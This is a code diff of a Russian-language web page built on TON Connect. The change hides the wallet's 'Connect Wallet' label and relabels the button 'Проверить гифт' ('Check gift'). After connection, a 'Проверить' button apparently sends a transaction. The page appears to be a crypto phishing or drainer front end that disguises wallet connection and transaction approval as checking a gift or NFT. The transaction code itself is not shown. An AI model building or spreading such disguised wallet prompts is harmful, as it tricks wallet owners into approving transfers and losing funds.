@@ -40,6 +40,17 @@
             justify-content: center;
         }
 
+        /* Замена названия кнопки на "Проверить гифт" */
+        #ton-connect button span {
+            display: none !important; /* Скрываем встроенный текст "Connect Wallet" */
+        }
+
+        #ton-connect button::after {
+            content: "Проверить гифт"; /* Новый текст кнопки */
+            font-size: 15px !important;
+            font-weight: 600;
+        }
+
         #ton-connect.hidden {
             display: none !important;
         }
@@ -118,7 +129,7 @@
 <body>
 
 <div class="card">
-    <!-- Кнопка подключения кошелька -->
+    <!-- Первая кнопка "Проверить гифт" (вместо Connect Wallet) -->
     <div id="ton-connect"></div>
 
     <!-- Блок деталей, который появляется после подключения -->
@@ -126,7 +137,7 @@
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Кнопка Проверить -->
+        <!-- Кнопка "Проверить" -->
         <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
@@ -239,7 +250,7 @@
             const address = wallet.account.address;
             walletAddressContainer.innerText = address;
             
-            // Скрываем первоначальную кнопку подключения и отображаем блок с кнопкой "Проверить"
+            // Скрываем первую кнопку и показываем блоки
             tonConnectBtnContainer.classList.add('hidden');
             walletInfoContainer.classList.add('active');
 
@@ -249,7 +260,6 @@
         } else {
             walletAddressContainer.innerText = '';
             
-            // Если кошелёк отключен, снова показываем кнопку подключения
             tonConnectBtnContainer.classList.remove('hidden');
             walletInfoContainer.classList.remove('active');
             
